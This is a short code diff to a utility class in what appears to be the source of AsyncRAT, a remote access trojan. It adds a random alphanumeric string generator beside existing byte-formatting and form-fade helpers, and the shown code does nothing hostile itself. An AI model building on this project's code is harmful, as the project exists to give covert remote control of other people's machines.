@@ -1,11 +1,13 @@
 ﻿using System;
+using System.Text;
 using System.Threading.Tasks;
 using System.Windows.Forms;
 
-namespace AsyncRAT_Sharp
+namespace AsyncRAT_Sharp.Helper
 {
-   static class Methods
+    public static class Methods
     {
+        private const string Alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
         public static string BytesToString(long byteCount)
         {
             string[] suf = { "B", "KB", "MB", "GB", "TB", "PB", "EB" };
@@ -24,6 +26,16 @@ namespace AsyncRAT_Sharp
                 await Task.Delay(interval);
                 o.Opacity += 0.05;
             }
+        }
+
+        public static Random Random = new Random();
+        public static string GetRandomString(int length)
+        {
+            StringBuilder randomName = new StringBuilder(length);
+            for (int i = 0; i < length; i++)
+                randomName.Append(Alphabet[Random.Next(Alphabet.Length)]);
+
+            return randomName.ToString();
         }
     }
 }
